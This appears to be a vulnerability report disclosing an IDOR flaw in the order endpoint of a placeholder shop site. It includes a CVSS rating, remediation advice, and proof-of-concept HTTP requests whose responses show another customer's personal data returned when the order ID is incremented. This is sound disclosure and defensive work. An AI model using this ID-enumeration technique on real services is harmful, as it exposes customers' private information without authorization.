# IDOR in Order Retrieval Endpoint – shop.example.com

## Summary
An Insecure Direct Object Reference (IDOR) vulnerability exists in the `/api/orders/{id}` endpoint. An authenticated user can replace the numeric order identifier in the request path and retrieve another user's order details, including personally identifiable information (name, address, phone number), without any authorization check.

## OWASP Category / CWE
- **OWASP Top 10 2021:** A01 – Broken Access Control
- **CWE:** CWE-639 – Authorization Bypass Through User-Controlled Key

## Severity
- **CVSS v3.1 Vector:** `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N`
- **Score:** 6.5 (Medium)
- **Reasoning:** The vulnerability is exploitable over the network with low attack complexity by an authenticated user (low privileges). No user interaction is required. Confidentiality impact is high because sensitive PII (name, address, phone) is exposed. Integrity and availability are not affected.

## Affected Asset
- **Host:** shop.example.com
- **Endpoint:** `GET /api/orders/{orderId}`
- **Parameter:** Path parameter `orderId` (numeric)

## Steps to Reproduce
1. Log in to shop.example.com as User A (valid credentials).
2. Send a GET request to `/api/orders/123` and observe the response containing User A's order details.
3. Modify the order ID in the request path from `123` to `124`.
4. Send the GET request to `/api/orders/124`.
5. Observe that the response returns order details belonging to a different user, including name, address, and phone number, without any authorization error or 403/404 response.

## Proof of Concept
**Request 1 (User A's own order):**
```
GET /api/orders/123 HTTP/1.1
Host: shop.example.com
Authorization: Bearer <user_A_token>
```

**Response 1:**
```json
{
  "orderId": 123,
  "userId": "userA",
  "name": "Alice Smith",
  "address": "123 Main St, City, Country",
  "phone": "+1-555-0101",
  "items": [...]
}
```

**Request 2 (Another user's order):**
```
GET /api/orders/124 HTTP/1.1
Host: shop.example.com
Authorization: Bearer <user_A_token>
```

**Response 2:**
```json
{
  "orderId": 124,
  "userId": "userB",
  "name": "Bob Jones",
  "address": "456 Oak Ave, City, Country",
  "phone": "+1-555-0202",
  "items": [...]
}
```

## Impact
An authenticated attacker can enumerate order IDs and harvest personally identifiable information (full name, shipping address, phone number) of other customers. This constitutes a data breach under privacy regulations (e.g., GDPR, CCPA) and enables further attacks such as social engineering, identity theft, or targeted phishing.

## Remediation
1. Implement proper authorization checks in the order retrieval endpoint: verify that the authenticated user owns the requested `orderId` before returning data.
2. Use indirect object references (e.g., random UUIDs) instead of sequential numeric IDs, but still enforce ownership validation.
3. Apply the principle of least privilege: ensure the API returns only data the user is authorized to access.
4. Add automated tests that attempt cross-user access to detect regressions.

## References
- OWASP: Broken Access Control – https://owasp.org/Top10/A01_2021-Broken_Access_Control/
- CWE-639 – https://cwe.mitre.org/data/definitions/639.html
- CVSS v3.1 Calculator – https://www.first.org/cvss/calculator/3.1